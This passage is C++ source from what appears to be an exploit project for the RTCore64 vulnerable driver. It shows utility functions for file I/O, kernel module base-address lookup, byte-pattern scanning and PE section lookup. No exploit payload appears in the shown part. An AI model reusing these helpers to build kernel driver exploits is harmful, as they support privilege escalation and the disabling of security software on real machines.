	if (!file_ifstream)
		return false;

	out_buffer->assign((std::istreambuf_iterator<char>(file_ifstream)), std::istreambuf_iterator<char>());
	file_ifstream.close();

	return true;
}

bool utils::CreateFileFromMemory(const std::wstring& desired_file_path, const char* address, size_t size) {
	std::ofstream file_ofstream(desired_file_path.c_str(), std::ios_base::out | std::ios_base::binary);

	if (!file_ofstream.write(address, size)) {
		file_ofstream.close();
		return false;
	}

	file_ofstream.close();
	return true;
}

uint64_t utils::GetKernelModuleAddress(const std::string& module_name) {
	void* buffer = nullptr;
	DWORD buffer_size = 0;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemModuleInformation), buffer, buffer_size, &buffer_size);

	while (status == nt::STATUS_INFO_LENGTH_MISMATCH) {
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(nullptr, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemModuleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status)) {
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);
		return 0;
	}

	const auto modules = static_cast<nt::PRTL_PROCESS_MODULES>(buffer);
	if (!modules)
		return 0;

	for (auto i = 0u; i < modules->NumberOfModules; ++i) {
		const std::string current_module_name = std::string(reinterpret_cast<char*>(modules->Modules[i].FullPathName) + modules->Modules[i].OffsetToFileName);

		if (!_stricmp(current_module_name.c_str(), module_name.c_str()))
		{
			const uint64_t result = reinterpret_cast<uint64_t>(modules->Modules[i].ImageBase);

			VirtualFree(buffer, 0, MEM_RELEASE);
			return result;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);
	return 0;
}

BOOLEAN utils::bDataCompare(const BYTE* pData, const BYTE* bMask, const char* szMask) {
	for (; *szMask; ++szMask, ++pData, ++bMask)
		if (*szMask == 'x' && *pData != *bMask)
			return 0;
	return (*szMask) == 0;
}

uintptr_t utils::FindPattern(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	size_t max_len = dwLen - strlen(szMask);
	for (uintptr_t i = 0; i < max_len; i++)
		if (bDataCompare((BYTE*)(dwAddress + i), bMask, szMask))
			return (uintptr_t)(dwAddress + i);
	return 0;
}

PVOID utils::FindSection(const char* sectionName, uintptr_t modulePtr, PULONG size) {
	size_t namelength = strlen(sectionName);
	PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)(modulePtr + ((PIMAGE_DOS_HEADER)modulePtr)->e_lfanew);
	PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(headers);
	for (DWORD i = 0; i < headers->FileHeader.NumberOfSections; ++i) {
		PIMAGE_SECTION_HEADER section = &sections[i];
		if (memcmp(section->Name, sectionName, namelength) == 0 &&
			namelength == strlen((char*)section->Name)) {
			if (!section->VirtualAddress) {
				return 0;
			}
			if (size) {
				*size = section->Misc.VirtualSize;
			}
			return (PVOID)(modulePtr + section->VirtualAddress);
		}
	}
	return 0;
}
```

`RTCore64_Vulnerability/utils.hpp`:

```hpp
#pragma once

#if defined(DISABLE_OUTPUT)
	#define Log(content) 
#else
	#define Log(content) std::wcout << content
#endif


#include <Windows.h>
#include <TlHelp32.h>
#include <stdint.h>
#include <vector>
#include <string>
#include <iostream>
#include <fstream>

#include "nt.hpp"

namespace utils
{
	std::wstring GetFullTempPath();
	bool ReadFileToMemory(const std::wstring& file_path, std::vector<uint8_t>* out_buffer);
	bool CreateFileFromMemory(const std::wstring& desired_file_path, const char* address, size_t size);
	uint64_t GetKernelModuleAddress(const std::string& module_name);
	BOOLEAN bDataCompare(const BYTE* pData, const BYTE* bMask, const char* szMask);
	uintptr_t FindPattern(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	PVOID FindSection(const char* sectionName, uintptr_t modulePtr, PULONG size);
}
```